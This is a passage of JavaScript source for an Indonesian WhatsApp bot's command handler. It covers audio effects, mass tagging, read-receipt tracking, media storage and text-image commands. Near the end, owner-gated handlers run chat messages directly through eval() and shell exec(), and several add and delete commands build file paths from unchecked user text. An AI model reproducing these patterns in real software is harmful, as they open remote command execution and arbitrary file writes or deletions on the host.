										exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											uhh = fs.readFileSync(ran)
											Zeeone.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc,duration:999999999999})
											fs.unlinkSync(ran)
											})
											} catch (e) {
												reply(mess.error)
												}  
												limitAdd(sender, limit)
									break
						case 'fast':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc})
											fs.unlinkSync(ran)
											})
											} catch (e) {
												reply(mess.error)
												}  
										limitAdd(sender, limit)
									break
						case 'robot':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'detikvn': case 'setdetikvn': case 'setdurasi':
									if (!Number(args[0])) return reply(`Example : ${prefix + command} 50`)
									reply(mess.wait)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									cokmatane = Number(args[0])
									hah = fs.readFileSync(media)
									Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted: Ofc})
									fs.unlinkSync(media)
									limitAdd(sender, limit)
									break
						case 'tupai':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc,duration:99})
											fs.unlinkSync(ran)
											})
											 } catch (e) {	
												reply(mess.error)
												}  	
												limitAdd(sender, limit)
												break
						case 'vibra': case 'vibrato':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=16" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'tinyurl':{
									if (args.length < 1) return reply(`Masukkan link`)
									if (!isUrl) return reply(`Masukkan link`)
										okok = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
										.then (async (a) =>{
										reply(`*Result : ${a.data}*`)
										})
										}
									break
						case 'infoall': case 'tagall':
									if (!isGroupAdmins && !Ofc.key.fromMe && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									var nom = Ofc.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`「 *TAG ALL*  」
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
						case 'hidetag': 
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										hideTag(from, `${q}`) 
										} else {  
											quotedText = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
											hideTag(from, `${quotedText}`)
											}
									break
						case 'mystat': case 'stats': case 'botstat': case 'infobot':{
									try {
										let totalchat = await Zeeone.chats.all()
										let i = []
										let giid = []
										for (let mem of totalchat){
											i.push(mem.jid)
											}
											for (let id of i){
												if (id && id.includes('g.us')){
													giid.push(id)
													}
												}
												const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Zeeone.user.phone
												nupe = owner_number + '@s.whatsapp.net'
												teks = `「 *BOT STATISTIC* 」 

🔖 Botname : ${namabot}
🔖 Owner : @${nupe.split("@")[0]}
🔖 Prefix : ${nopref?'No prefix':multiprefix?'Multi prefix':prefix}
🔖 Runtime : ${kyun(process.uptime())}
🔖 Speed : ${processsTime(Ofc.messageTimestamp.low, moment())}s
🔖 Status : ${public_mode? `Public Mode`:`Self Mode`}
🔖 Total Hit : ${hitall}
🔖 Personal Chat : ${totalchat.length - giid.length}
🔖 Group Chat : ${giid.length}
🔖 Total Chat : ${totalchat.length}
🔖 Total User : ${_user.length}
🔖 Total Block : ${blocked.length}
🔖 Total Baned : ${ban.length}

🏷️ Anti Call : ${setting.anti_call}
🏷️ Anti Delete : ${setting.anti_delete}
🏷️ Auto Register : ${autoregister}
🏷️ Auto Respond : ${autorespon? `False` : `True`}
🏷️ Multi Prefix : ${multiprefix}

「 *PHONE STATISTIC* 」
 
🔖 Whatsapp Ver. : ${wa_version}
🔖 Ram : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
🔖 Mcc : ${mcc}
🔖 Mnc : ${mnc}
🔖 Versi OS : ${os_version}
🔖 Merk HP : ${device_manufacturer}
🔖 Versi HP : ${device_model}
🔖 Browser : ${Zeeone.browserDescription}
🔖 Baterai : ${isBattre} %
🔖 Charging : ${isCharge}
`
let qqppp = [{
                    "buttonId": `${prefix}owner`,
                    "buttonText": {
                        "displayText": "OWNER"
                    },
                    "type": "RESPONSE"
                },{
                    "buttonId": `${prefix}sewa`,
                    "buttonText": {
                        "displayText": "SEWA"
                    },
                    "type": "RESPONSE"
                }]
                sendButLocation(from, teks, `NASA-BOT™© | Mhycka Herviananda.`, thumbnail, qqppp, {contextInfo: { mentionedJid: [nupe]}})
				
} catch (e){
reply(`${e}`)
}
}
break
						case 'clearall':{
									if (!isOwner && !Ofc.key.fromMe) return
									let chiit = await Zeeone.chats.all()
									for (let i of chiit){
										Zeeone.modifyChat(i.jid, 'clear', {
											includeStarred: false
											})
											}
											reply(`Succes Lord`)
											}
									break
						case 'runtime': case 'tes': case 'test': case 'ping':{
									reply(`${runtime2}`)
									}
									break
						case 'cekapikey':
									if (!isOwner && !Ofc.key.fromMe) return
									anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${lolkey}`)
									teks = `─「 *APIKEY CEK* 」─\n\n➸ *Username :* ${anu.result.username}\n➸ *REQUEST :* ${anu.result.requests}\n➸ *Today :* ${anu.result.today}\n➸ *Akun Type :* ${anu.result.account_type}\n➸ *Expired :* ${anu.result.expired}`
									Zeeone.sendMessage(`${ownerNumber}`, teks, text, {quoted: Ofc})
									break
						case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										Zeeone.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: Ofc, caption: `Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ`})
										limitAdd(sender, limit)
									})
									}
									break
						case 'getpic': case 'getpp': case 'getprofile':{
									if (!isGroup) return reply(mess.only.group)
									reply(mess.wait)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return
									mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
									try {
										pp = await Zeeone.getProfilePicture(mentioned)
										} catch {
											pp = `${imagebb}`
											}
											buffer = await getBuffer(pp)
											Zeeone.sendMessage(from, buffer, image, {quoted: Ofc, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail: thumbnail, contextInfo:{mentionedJid:[mentioned]}})
											}
									break
						case 'getnum': case 'getnomor': case 'getnumber':
									if (!isGroup) return reply(mess.only.group)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return reply('Reply Pesan Target Lord')
									mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
									reply(`${mentioned.split('@')[0]}`)
									break
						case 'towame':
									if (Ofc.message.extendedTextMessage != undefined){
										mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										reply(`wa.me/`+mentioned.split("@")[0])
										} else {
											reply(`${prefix+command} @tag atau reply`)
											}
											break
						case 'wame':
									wamo = q.replace(new RegExp("[()/ ]", "gi"), "+")
									reply(q?`wa.me/`+sender.split("@")[0]+'?text='+wamo: `wa.me/`+sender.split("@")[0])
									break
						case 'sendkontak': case 'kontak':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (Ofc.message.extendedTextMessage != undefined){
										mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										const ynkos = 'BEGIN:VCARD\n' 
										+ 'VERSION:3.0\n' 
										+ `FN:${q?q:`KONTAK`}\n`
										+ `ORG:KONTAK;\n`
										+ `TEL;type=CELL;type=VOICE;waid=${mentioned.split("@")[0]}:+${mentioned.split("@")[0]}\n`
										+ 'END:VCARD'
										Zeeone.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: Ofc})
										} else {
											const ynkos = 'BEGIN:VCARD\n' 
											+ 'VERSION:3.0\n' 
											+ `FN:${q.split('|')[1]}\n`
											+ `ORG:KONTAK;\n`
											+ `TEL;type=CELL;type=VOICE;waid=${q.split('|')[0]}:+${q.split('|')[0]}\n`
											+ 'END:VCARD'
											Zeeone.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: Ofc})
											}
									break 
						case 'notif':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									teks = `Notif Dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
									group = await Zeeone.groupMetadata(from);
									member = group['participants']
									jids = [];
									member.map(async adm => {
										jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
										})
										options = {
											text: teks,
											contextInfo: {
												mentionedJid: jids
												},
												quoted: Ofc
												}
												await Zeeone.sendMessage(from, options, text)
												limitAdd(sender, limit)
										break
						case 'addvn': case 'addaudio': case 'addmusic':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedAudio) return reply('Reply Audionya Lord')
									if (!q) return reply('Nama Audionya Apa Lord?')
									let addvn = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let delb = await Zeeone.downloadMediaMessage(addvn)
									audionye.push(q)
									fs.writeFileSync(`./database/audio/${q}.mp3`, delb)
									fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
									reply(`Sukses Menambahkan Audio!\nCek Audio Dengan Cara Ketik ${prefix}listvn`)
									break
						case 'delaudio': case 'delvn': case 'deletevn':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Audio Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/audio/${q}.mp3`)
										let delaudio = audionye.indexOf(q)
										audionye.splice(delaudio, 1)
										fs.writeFileSync('./database/audio.json', JSON.stringify(audionye))
										reply(`Succes Menghapus Audio ${q}!`)
										await sleep(5000)
										} catch (err) {
											console.log(err)
											reply(`Gagal Menghapus Audio ${q}!`)
										}
									break
						case 'listvn': case 'listaudio':
									Zeeone.updatePresence(from, Presence.avaible) 
									teks = '*「 LIST AUDIO 」*\n\n'
									for (let awokwkwk of audionye) {
										teks += `📊 ${awokwkwk}\n`
										}
										teks += `\n*TOTAL :* ${audionye.length}`
										reply(`${teks}`)
									break
						case 'addimage': case 'addfoto': case 'addphoto':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedImage) return reply('Reply Photonya Lord')
									if (!q) return reply('Nama Photonya Apa Lord?')
									let addimage = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let dellb = await Zeeone.downloadMediaMessage(addimage)
									imagenye.push(q)
									fs.writeFileSync(`./database/image/${q}.jpg`, dellb)
									fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
									reply(`Sukses Menambahkan Image!\nCek Image Dengan Cara Ketik ${prefix}listimage`)
									break
						case 'delimage': case 'deleteimage': case 'delfoto': case 'delphoto':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Sticker Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/image/${q}.webp`)
										let delimage = imagenye.indexOf(q)
										imagenye.splice(delimage, 1)
										fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
										reply(`Succes Menghapus Image ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus Image ${q}!`)
										}
									break
						case 'listimage': case 'listphoto': case 'listfoto': 
									let listimage = '*「 LIST STICKER 」*\n\n'
									for (let awokwkwk of imagenye) {
										listimage += `📊 ${awokwkwk}\n`
										}
										listimage += `\n*TOTAL :* ${imagenye.length}`
										reply(`${listimage}`)
									break
						case 'addvideo': case 'addvid':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedVideo) return reply('Reply Videonya Lord')
									if (!q) return reply('Nama Videonya Apa Lord?')
									let addvideo = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let dellbb = await Zeeone.downloadMediaMessage(addvideo)
									videonye.push(q)
									fs.writeFileSync(`./database/video/${q}.mp4`, dellbb)
									fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
									reply(`Sukses Menambahkan Video!\nCek Video Dengan Cara Ketik ${prefix}listvideo`)
									break
						case 'delvideo': case 'deletevideo':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Video Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/video/${q}.webp`)
										let delvideo = videonye.indexOf(q)
										videonye.splice(delvideo, 1)
										fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
										reply(`Succes Menghapus Video ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus Video ${q}!`)
										}
									break
						case 'listvideo': case 'listvid':  
									let listvideo = '*「 LIST VIDEO 」*\n\n'
									for (let awokwkwk of videonye) {
										listvideo += `📊 ${awokwkwk}\n`
										}
										listvideo += `\n*TOTAL :* ${videonye.length}`
										reply(`${listvideo}`)
									break
						case 'addstik': case 'addstiker': case 'addsticker':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedSticker) return reply('Reply stiker nya Lord')
									if (!q) return reply('Nama Sticker Nya Apa Lord?')
									let addstik = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let delbb = await Zeeone.downloadMediaMessage(addstik)
									setiker.push(q)
									fs.writeFileSync(`./database/stick/${q}.webp`, delbb)
									fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
									reply(`Sukses Menambahkan Sticker!!\nCek Sticker Dengan Cara Ketik ${prefix}liststick`)
									break
						case 'delstik': case 'delstick': case 'delsticker': case 'delstiker':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Sticker Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/stick/${q}.webp`)
										let delstik = setiker.indexOf(q)
										setiker.splice(delstik, 1)
										fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
										reply(`Succes Menghapus sticker ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus sticker ${q}!`)
										}
									break
						case 'liststik': case 'liststicker': case 'liststiker': case 'liststick':
									liststik = '*「 LIST STICKER 」*\n\n'
									for (let awokwkwk of setiker) {
										liststik += `📊 ${awokwkwk}\n`
										}
										liststik += `\n*TOTAL :* ${setiker.length}`
										reply(`${liststik}`)
									break
						case 'addrespon': case 'addres':
									if (!isPremium && !isOwner && !Ofc.key.fromMe) return reply(mess.only.prem)
									 if (args.length < 1) return reply(`Kirim perintah ${command} command|jawaban`)
									var soal = q.split('|')[0]
									var jawaban = q.split('|')[1]
									if (!jawaban) return reply(`Jawabannya apa?`)
									if (checkCommands(soal.toLowerCase(), cmdDB)) return reply(`Command tersebut sudah ada!`)
									addCommands(soal.toLowerCase(), jawaban, sender, cmdDB)
									reply('Sukses!')
									break
						case 'deleterespon': case 'dellrespon': case 'delrespon': 
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah ${command} list respon`)
									if (isCreated(q.toLowerCase(), sender, cmdDB) && !isOwner) return reply(`Anda bukan pembuat command!`)
									deleteCommands(q.toLowerCase(), cmdDB)
									reply('Sukses Lord')
									break
						case 'listrespon': case 'listres':
									if (!isOwner && !Ofc.key.fromMe) return
									var txtt = `LIST REPONSE\nJumlah : *${cmdDB.length}*\n\n`
									for (let i of cmdDB){
										txtt += `*Respon :* ${i.commands}\n*Jawaban :* ${i.jawaban}\n*Created :* @${i.created.split("@")[0]}\n\n`
										}
										Zeeone.sendMessage(`${ownerNumber}`, txtt, text, { quoted: Ofc, contextInfo:{ mentionedJid: parseMention(txtt) }})
										break
						case 'chatinfo': case 'sider':{
									if (!isGroup) return reply(mess.only.group)
									infom = await Zeeone.messageInfo(from, Ofc.message.extendedTextMessage.contextInfo.stanzaId)
									hemm = infom.reads
									hemms = infom.deliveries
									readon = hemms.map(v => v.jid)
									readdin = hemm.map(v => v.jid)
									stamp = hemm.map(v => v.t)
									function toTime(UNIXtimestamp, ribuan) {
										ribuan = (typeof ribuan == 'undefined') ? false : true;
										let a = new Date(UNIXtimestamp);
										if (ribuan) {
											a = new Date(UNIXtimestamp * 1000);
											}
											var hour = a.getHours();
											var min = a.getMinutes();
											var sec = a.getSeconds();
											var time = `${hour}:${min}:${sec}`;
											return time;
										}

										function toBulan(UNIXtimestamp, ribuan) {
											ribuan = (typeof ribuan == 'undefined') ? false : true;
											let a = new Date(UNIXtimestamp);
											if (ribuan) {
												a = new Date(UNIXtimestamp * 1000);
												}
												var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember'];
												var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum at', 'Sabtu'];
												var day = a.getDate()
												bulanee = a.getMonth()
												var thisDay = a.getDay(),
												thisDay = myDays[thisDay];
												var yy = a.getYear()
												var year = (yy < 1000) ? yy + 1900 : yy;
												var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}`;
												return bul;
												}
												teksx = `「 *TELAH DIBACA* 」\n\n`
												for (let i of hemm) {
													teksx += `📛 Nama : @${i.jid.split('@')[0]}\n⏰ Waktu : ${toTime(i.t, true)}\n📅 Tanggal : ${toBulan(i.t, true)}\n\n`
													}
												teksx1 = `「 *BELUM DIBACA* 」\n\n`
												for (let i of hemms) {
													teksx1 += `📛 Nama : @${i.jid.split('@')[0]}\n`
													teksx1 += `⏰ Waktu : ${toTime(i.t, true)}\n📅 Tanggal : ${toBulan(i.t, true)}\n\n`
													}
												Zeeone.sendMessage(from, teksx, text, { sendEphemeral: false, quoted: Ofc, thumbnail: thumbnail, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readdin } })
												Zeeone.sendMessage(from, teksx1, text, { sendEphemeral: false, quoted: Ofc, thumbnail: thumbnail, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readon } })
												}
												break
						case 'jadian':
									if (!isGroup) return reply(mess.only.group)
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									jds = []
									const A11 = groupMembers
									const B11 = groupMembers
									const C11 = A11[Math.floor(Math.random() * A11.length)] 
									const C22 = B11[Math.floor(Math.random() * B11.length)]
									D11 = `*「 JADIAN 」*\n\n@${C11.jid.split('@')[0]} ❤ @${C22.jid.split('@')[0]}\n\nMogaa Langgeng 😘`  
									jds.push(C11.jid)
									jds.push(C22.jid)
									mentions(D11, jds, true)
									await limitAdd(sender, limit)
									break
						case 'naruto':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pNaruto(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url, q)
										})
									break
						case 'shadow':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pShadow(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'romantic':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pRomantic(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'smoke':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pSmoke(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'burnpaper':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pBurnPapper(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'lovemsg':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveMsg(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'grass':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pMsgGrass(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'doubleheart':
									if (!q) return reply('teksnya Lord?')
									reply(mess.wait)
									pDoubleHeart(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'coffecup':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pCoffeCup(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'lovetext':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveText(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'butterfly':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pButterfly(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
									break
												default:
		if(budy.includes("@verif", "@verify","daftar")){
			if (isUser) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user.json', JSON.stringify(_user))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`, thumbnail, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
return Zeeone.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: Ofc})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
return Zeeone.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: Ofc})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!Ofc.key.fromMe && !isOwner && !isCreator ) return reply(mess.only.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`LordUserbot :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
